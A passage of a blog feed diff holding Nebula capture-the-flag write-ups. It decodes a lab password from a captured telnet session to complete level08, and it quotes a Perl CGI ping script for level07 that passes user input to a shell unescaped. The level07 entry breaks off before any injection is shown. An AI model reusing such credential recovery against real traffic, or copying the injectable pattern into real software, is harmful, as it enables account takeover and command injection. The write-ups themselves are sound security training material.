+&lt;p&gt;In other words:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+   &lt;span class=&quot;mo&quot;&gt;00000000&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;                                           &lt;span class=&quot;o&quot;&gt;..%&lt;/span&gt;
+&lt;span class=&quot;mo&quot;&gt;00000000&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fc&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;                                           &lt;span class=&quot;o&quot;&gt;..%&lt;/span&gt;
+    &lt;span class=&quot;mo&quot;&gt;00000003&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fb&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;..&amp;amp;.....&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#..'.&lt;/span&gt;
+    &lt;span class=&quot;mo&quot;&gt;00000013&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;                                              &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;span class=&quot;mo&quot;&gt;00000003&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fe&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fb&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fb&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fb&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fb&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;..&amp;amp;.....&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#..'.&lt;/span&gt;
+&lt;span class=&quot;mo&quot;&gt;00000013&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;fc&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;                                              &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+    &lt;span class=&quot;mo&quot;&gt;00000015&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fa&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fa&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fa&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.....&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#.....'.&lt;/span&gt;
+    &lt;span class=&quot;mo&quot;&gt;00000025&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fa&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f0&lt;/span&gt;                            &lt;span class=&quot;o&quot;&gt;........&lt;/span&gt;
+&lt;span class=&quot;mo&quot;&gt;00000015&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fa&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3840&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;38400.&lt;/span&gt;
+&lt;span class=&quot;mo&quot;&gt;00000025&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;f0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fa&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f0&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#.Sod aCan:0..&lt;/span&gt;
+&lt;span class=&quot;mo&quot;&gt;00000035&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fa&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;44&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'..DIS PLAY.Sod&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;00000045  61 43 61 6e 3a 30 ff f0  ff fa 18 00 78 74 65 72   aCan:0.. ....xter&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;00000055  6d ff f0                                           m..&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    0000002D  ff fb 03 ff fd 01 ff fd  22 ff fd 1f ff fb 05 ff   ........ &quot;.......&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    0000003D  fd 21                                              .!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;00000058  ff fd 03 ff fc 01 ff fb  22 ff fa 22 03 01 00 00   ........ &quot;..&quot;....&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;00000068  03 62 03 04 02 0f 05 00  00 07 62 1c 08 02 04 09   .b...... ..b.....&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;00000078  42 1a 0a 02 7f 0b 02 15  0f 02 11 10 02 13 11 02   B....... ........&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;00000088  ff ff 12 02 ff ff ff f0  ff fb 1f ff fa 1f 00 b1   ........ ........&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;00000098  00 31 ff f0 ff fd 05 ff  fb 21                     .1...... .!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    0000003F  ff fa 22 01 03 ff f0                               ..&quot;....&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000A2  ff fa 22 01 07 ff f0                               ..&quot;....&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    00000046  ff fa 21 03 ff f0 ff fb  01 ff fd 00 ff fe 22      ..!..... ......&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000A9  ff fd 01 ff fb 00 ff fc  22                        ........ &quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    00000055  ff fa 22 03 03 e2 03 04  82 0f 07 e2 1c 08 82 04   ..&quot;..... ........&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    00000065  09 c2 1a 0a 82 7f 0b 82  15 0f 82 11 10 82 13 11   ........ ........&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    00000075  82 ff ff 12 82 ff ff ff  f0                        ........ .&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    0000007E  0d 0a 4c 69 6e 75 78 20  32 2e 36 2e 33 38 2d 38   ..Linux  2.6.38-8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    0000008E  2d 67 65 6e 65 72 69 63  2d 70 61 65 20 28 3a 3a   -generic -pae (::&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    0000009E  66 66 66 66 3a 31 30 2e  31 2e 31 2e 32 29 20 28   ffff:10. 1.1.2) (&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    000000AE  70 74 73 2f 31 30 29 0d  0a 0a 01 00 77 77 77 62   pts/10). ....wwwb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    000000BE  75 67 73 20 6c 6f 67 69  6e 3a 20                  ugs logi n:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000B2  6c                                                 l&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    000000C9  00 6c                                              .l&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000B3  65                                                 e&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    000000CB  00 65                                              .e&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000B4  76                                                 v&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    000000CD  00 76                                              .v&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000B5  65                                                 e&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    000000CF  00 65                                              .e&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000B6  6c                                                 l&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    000000D1  00 6c                                              .l&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000B7  38                                                 8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    000000D3  00 38                                              .8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000B8  0d                                                 .&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    000000D5  01                                                 .&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    000000D6  00 0d 0a 50 61 73 73 77  6f 72 64 3a 20            ...Passw ord:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000B9  62                                                 b&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000BA  61                                                 a&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000BB  63                                                 c&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000BC  6b                                                 k&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000BD  64                                                 d&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000BE  6f                                                 o&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000BF  6f                                                 o&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000C0  72                                                 r&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000C1  7f                                                 .&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000C2  7f                                                 .&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000C3  7f                                                 .&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000C4  30                                                 0&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000C5  30                                                 0&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000C6  52                                                 R&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000C7  6d                                                 m&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000C8  38                                                 8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000C9  7f                                                 .&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000CA  61                                                 a&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000CB  74                                                 t&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000CC  65                                                 e&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000CD  0d                                                 .&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    000000E3  00 0d 0a                                           ...&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    000000E6  01                                                 .&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    000000E7  00 0d 0a 4c 6f 67 69 6e  20 69 6e 63 6f 72 72 65   ...Login  incorre&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    000000F7  63 74 0d 0a 77 77 77 62  75 67 73 20 6c 6f 67 69   ct..wwwb ugs logi&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    00000107  6e 3a 20                                           n:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here you can observe that the “dots” are actually 0x7f in hexa which means “Backspace” in ASCII. So instead of “backdoor…​00Rm8.ate” as password we have “backd00Rmate”. For the grand final:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level08@nebula:/home/flag08$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;uid=1009(level08) gid=1009(level08) groups=1009(level08)
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level08@nebula:/home/flag08$&lt;/span&gt; su flag08
+&lt;span class=&quot;go&quot;&gt;Password:
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;sh-4.2$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;uid=991(flag08) gid=991(flag08) groups=991(flag08)
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;sh-4.2$&lt;/span&gt; getflag
+&lt;span class=&quot;go&quot;&gt;You have successfully executed getflag on a target account
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;sh-4.2$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;See you in the next tutorial.&lt;/p&gt;
+
+&lt;h3 id=&quot;sources&quot;&gt;Sources&lt;/h3&gt;
+&lt;p&gt;https://www.wireshark.org/docs/wsug_html_chunked/ChapterIntroduction.html&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Lucian Nitescu</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="nebula" />
+      
+        <category term="writeups" />
+      
+
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
+  
+  
+  
+    <entry>
+      
+      <title type="html">Exploit Exercises: Nebula Level 07</title>
+      
+      
+      <link href="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-07/" rel="alternate" type="text/html" title="Exploit Exercises: Nebula Level 07" />
+      
+      <published>2018-07-16T15:48:00-03:00</published>
+      <updated>2018-07-16T15:48:00-03:00</updated>
+      <id>https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-07</id>
+      <content type="html" xml:base="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-07/">&lt;p&gt;&lt;img src=&quot;/uploads/Screenshot%20from%202018-07-16%2000-20-16.png&quot; alt=&quot;Image of Nebula Terminal&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.
+To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.&lt;/p&gt;
+
+&lt;h3 id=&quot;source-code&quot;&gt;Source code&lt;/h3&gt;
+
+&lt;p&gt;(index.cgi)&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/usr/bin/perl
+
+use CGI qw{param};
+
+print &quot;Content-type: text/html\n\n&quot;;
+
+sub ping {
+  $host = $_[0];
+
+  print(&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;Ping results&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&lt;/span&gt;&quot;);
+
+  @output = `ping -c 3 $host 2&amp;gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;1`;&lt;/span&gt;
+  foreach $line (@output) { print &quot;$line&quot;; }
+
+  print(&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&quot;);
+
+}
+
+# check if Host set. if not, display normal page, etc
+
+ping(param(&quot;Host&quot;));
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;Well, you will be surprised that this challenge took me days to complete because my webserver on my machine is getting down at every 20 minutes after system boot. I have not researched more about why the challenge is crashing all the time, but here is the simple solution of this nice challenge:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level07@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;index.cgi
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level07@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;index.cgi
+&lt;span class=&quot;gp&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+&lt;span class=&quot;gp&quot;&gt;level07@nebula:~$&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;Hmm, let’s go the flag account folder.
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level07@nebula:/home/flag07$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 10
+drwxr-x--- 2 flag07 level07  102 Nov 20  2011 .
+drwxr-xr-x 1 root   root      80 Aug 27  2012 ..
+-rw-r--r-- 1 flag07 flag07   220 May 18  2011 .bash_logout
+-rw-r--r-- 1 flag07 flag07  3353 May 18  2011 .bashrc
+-rw-r--r-- 1 flag07 flag07   675 May 18  2011 .profile
+-rwxr-xr-x 1 root   root     368 Nov 20  2011 index.cgi
+-rw-r--r-- 1 root   root    3719 Nov 20  2011 thttpd.conf
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level07@nebula:/home/flag07$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here we are able to see two files, index.cgi and thttpd.conf. Let’s read their content.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level07@nebula:/home/flag07$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;index.cgi
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;/usr/bin/perl
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;use CGI qw{param};&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;print &quot;Content-type: text/html\n\n&quot;;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+sub ping {
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;	$&lt;/span&gt;host &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0]&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
